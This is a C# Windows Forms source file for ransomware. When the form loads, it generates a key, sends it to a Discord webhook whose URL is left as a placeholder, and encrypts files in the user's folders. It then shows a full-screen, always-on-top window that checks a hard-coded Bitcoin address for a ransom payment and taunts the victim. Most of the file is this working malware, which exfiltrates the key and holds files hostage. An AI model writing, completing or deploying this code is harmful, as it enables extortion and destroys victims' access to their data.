using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Net.Http;
using System.Security.Cryptography;



namespace WindowsFormsApp2
{
    public partial class Form2 : Form

    {
        private string originalErrorMessage = "";
        private string password;

        public Form2()
        {

            InitializeComponent();

            WindowState = FormWindowState.Maximized;

            // Make TextBox full screen

            // Make RichTextBox full screen
            richTextBox1.Dock = DockStyle.Fill;
            this.TopMost = true;


        }

        private async void Form2_Load(object sender, EventArgs e)
        {
            byte[] keyBytes = new byte[4]; // 32-bit key is 4 bytes
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(keyBytes);
            }

            string aesKey = Convert.ToBase64String(keyBytes);
            string password = $"{aesKey}";

            await SendWebhookMessage(password);

            AESFileEncryption.EncryptFilesInUsersFolder(password);
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

            originalErrorMessage = "";
        }


        public void button1_Click(object sender,  EventArgs e)
        {
            try
            {
                string currentPassword = password;
                var priceUsd = btcapi.GetPrice();
                var address = "bc1qxgjdszlt7x6zv8khvade8w664sk03cqmj0chp5";
                var balanceBtc = btcapi.GetBalanceBtc(address);
                var balanceUsd = (int)(balanceBtc * priceUsd);

                if (balanceUsd > Config.AmountUSD)
                {
                    timer1.Stop();
                    button1.Enabled = false;
                    button1.BackColor = Color.Lime;
                    button1.Text = @"Great job, I'm decrypting your files...";
                    MessageBox.Show(this, @"Decrypting your files. "
                        + @"It will take a while. "
                        + @"After it's done, I will close and completely remove myself from your computer.",
                        @"Great job");
                }
                else if (balanceUsd > 0)
                {
                    button1.BackColor = Color.Tomato;
                    button1.Text = @"You did not send me enough! Try again!";
                }
                else
                {
                    button1.BackColor = Color.Tomato;
                    button1.Text = @"You haven't made a payment yet! Try again!";
                }
            }
            catch (Exception ex)
            {
                originalErrorMessage = ex.Message; // Store the original error message
                button1.Text = @"An error occurred while checking your payment. Try again later.";
                button1.BackColor = Color.Tomato;
                Console.WriteLine(ex.Message);
            }

            // Check if the password is correct and display the original error message
            if (!string.IsNullOrEmpty(textBox1.Text) && textBox1.Text != password)
            {
                button1.Text = @"Incorrect password. " + originalErrorMessage;
            }
        }
        static async Task SendWebhookMessage(string message)
        {
            string webhookUrl = "webhook url here"; //Put your discord webhook url here

            using (var client = new HttpClient())
            {
                var payload = new { content = message };
                var jsonPayload = JsonConvert.SerializeObject(payload);
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                var response = await client.PostAsync(webhookUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Webhook message sent successfully.");
                }
                else
                {
                    Console.WriteLine($"Failed to send webhook message. StatusCode: {response.StatusCode}");
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var newForm = new Form3();
            newForm.Show();

        }
    }
}



